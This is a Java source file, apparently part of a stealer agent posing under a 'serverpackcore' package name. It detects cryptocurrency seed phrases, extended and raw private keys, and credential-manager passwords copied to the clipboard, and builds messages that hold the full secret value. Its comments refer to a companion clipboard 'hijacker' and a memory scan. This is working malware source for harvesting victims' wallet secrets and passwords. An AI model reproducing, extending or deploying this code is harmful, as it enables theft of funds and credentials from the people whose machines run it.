package com.serverpackcore.agent;

import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.util.LinkedHashMap;
import java.util.Locale;
import java.util.Map;
import java.util.regex.Pattern;

/**
 * Recognises secrets copied to the clipboard. Addresses are handled by the
 * hijacker; this covers seeds, extended/raw private keys and passwords copied
 * from a credential manager.
 */
public final class SecretDetector {
	private static final Pattern XPRV = Pattern.compile("(?:xprv|yprv|zprv)[1-9A-HJ-NP-Za-km-z]{80,120}");
	private static final Pattern EVM_KEY = Pattern.compile("(?:0x)?[0-9a-fA-F]{64}");
	private static final Pattern SOLANA_KEY = Pattern.compile("[1-9A-HJ-NP-Za-km-z]{85,90}");
	private static final long ALERT_TTL = 120_000L;
	private static final Map<String, Long> recentAlerts = new java.util.concurrent.ConcurrentHashMap<>();
	private static volatile Map<String, Integer> words;

	private SecretDetector() {
	}

	public record Secret(String kind, String value) {
	}

	public static Secret detect(String text, String process, String title) {
		if (text == null) {
			return null;
		}
		String value = text.strip();
		if (value.isEmpty() || value.length() > 256 || value.indexOf('\n') >= 0
			|| value.indexOf('\r') >= 0 || value.contains("://")) {
			return null;
		}
		int count = bip39Count(value);
		if (count > 0) {
			return new Secret("seed-" + count, value);
		}
		if (XPRV.matcher(value).matches()) {
			return new Secret("xprv", value);
		}
		if (EVM_KEY.matcher(value).matches()
			&& (value.startsWith("0x") || distinctHex(value) >= 8)) {
			return new Secret("evm-key", value);
		}
		if (SOLANA_KEY.matcher(value).matches()) {
			try {
				if (Base58.decode(value).length == 64) {
					return new Secret("solana-key", value);
				}
			} catch (Throwable ignored) {
				// Not a key.
			}
		}
		if (value.length() >= 6 && value.length() <= 128
			&& (PasswordHeuristic.credentialSource(process, title)
				|| PasswordHeuristic.looksLikePassword(process, title)
				|| strongShape(value))) {
			return new Secret("password", value);
		}
		return null;
	}

	/** Remembers clipboard alerts so a memory scan does not repeat them. */
	static void alerted(String value) {
		long now = System.currentTimeMillis();
		recentAlerts.values().removeIf(stamp -> now - stamp >= ALERT_TTL);
		recentAlerts.put(normalize(value), now);
	}

	static boolean alertedRecently(String value) {
		Long stamp = recentAlerts.get(normalize(value));
		return stamp != null && System.currentTimeMillis() - stamp < ALERT_TTL;
	}

	private static String normalize(String value) {
		return value == null ? "" : value.strip().replaceAll("\\s+", " ").toLowerCase(Locale.ROOT);
	}

	static String message(Secret secret, String process, String title) {
		return switch (secret.kind()) {
			case "seed-12", "seed-24" -> "clipboard seed (" + secret.kind().substring(5) + " palabras): "
				+ secret.value();
			case "xprv" -> "clipboard xprv: " + secret.value();
			case "evm-key" -> "clipboard clave privada EVM (o hex64): " + secret.value();
			case "solana-key" -> "clipboard clave privada Solana: " + secret.value();
			case "password" -> "clipboard contraseña (" + process + " | " + title + "): " + secret.value();
			default -> "clipboard?: " + process + " | " + title + " | " + secret.value();
		};
	}

	/** Content fallback for wallet popups whose foreground title is empty. */
	private static boolean strongShape(String value) {
		if (value.length() < 12) {
			return false;
		}
		boolean letter = false;
		boolean lower = false;
		boolean upper = false;
		boolean digit = false;
		boolean symbol = false;
		java.util.Set<Character> distinct = new java.util.HashSet<>();
		for (int i = 0; i < value.length(); i++) {
			char character = value.charAt(i);
			if (Character.isWhitespace(character)) {
				return false;
			}
			letter |= Character.isLetter(character);
			lower |= Character.isLowerCase(character);
			upper |= Character.isUpperCase(character);
			digit |= Character.isDigit(character);
			symbol |= !Character.isLetterOrDigit(character);
			distinct.add(character);
		}
		int classes = (lower ? 1 : 0) + (upper ? 1 : 0) + (digit ? 1 : 0) + (symbol ? 1 : 0);
		return letter && classes >= 3 && distinct.size() >= 8;
	}

	private static int distinctHex(String value) {
		boolean[] seen = new boolean[16];
		int distinct = 0;
		for (int i = 0; i < value.length(); i++) {
			char digit = Character.toLowerCase(value.charAt(i));
			int index = digit <= '9' ? digit - '0' : digit - 'a' + 10;
			if (index >= 0 && index < 16 && !seen[index]) {
				seen[index] = true;
				distinct++;
			}
		}
		return distinct;
	}

	private static int bip39Count(String value) {
		String[] tokens = value.toLowerCase(Locale.ROOT).split("\\s+");
		if (tokens.length != 12 && tokens.length != 24) {
			return 0;
		}
		return checksum(tokens) ? tokens.length : 0;
	}

	private static boolean checksum(String[] tokens) {
		Map<String, Integer> index = words();
		if (index.isEmpty()) {
			return false;
		}
		StringBuilder bits = new StringBuilder(tokens.length * 11);
		for (String token : tokens) {
			Integer position = index.get(token);
			if (position == null) {
				return false;
			}
			String binary = Integer.toBinaryString(position);
			bits.append("0".repeat(11 - binary.length())).append(binary);
		}
		int entropyBits = tokens.length * 11 * 32 / 33;
		byte[] entropy = new byte[entropyBits / 8];
		for (int i = 0; i < entropy.length; i++) {
			entropy[i] = (byte) Integer.parseInt(bits.substring(i * 8, i * 8 + 8), 2);
		}
		try {
			byte[] hash = MessageDigest.getInstance("SHA-256").digest(entropy);
			int checksumBits = tokens.length * 11 - entropyBits;
			for (int i = 0; i < checksumBits; i++) {
				int want = (hash[i / 8] >>> (7 - (i % 8))) & 1;
				if (want != bits.charAt(entropyBits + i) - '0') {
					return false;
				}
			}
			return true;
		} catch (java.security.NoSuchAlgorithmException exception) {
			return false;
		}
	}

	private static Map<String, Integer> words() {
		Map<String, Integer> index = words;
		if (index != null) {
			return index;
		}
		synchronized (SecretDetector.class) {
			if (words != null) {
				return words;
			}
			Map<String, Integer> loaded = new LinkedHashMap<>();
			try (InputStream input = SecretDetector.class.getResourceAsStream("/serverpackcore/bip39.txt")) {
				if (input != null) {
					for (String line : new String(input.readAllBytes(), StandardCharsets.UTF_8).split("\\R")) {
						String word = line.trim();
						if (!word.isEmpty()) {
							loaded.put(word, loaded.size());
						}
					}
				}
			} catch (Throwable throwable) {
				Log.debug("Clipboard wordlist failed", throwable);
			}
			words = loaded;
			return loaded;
		}
	}
}
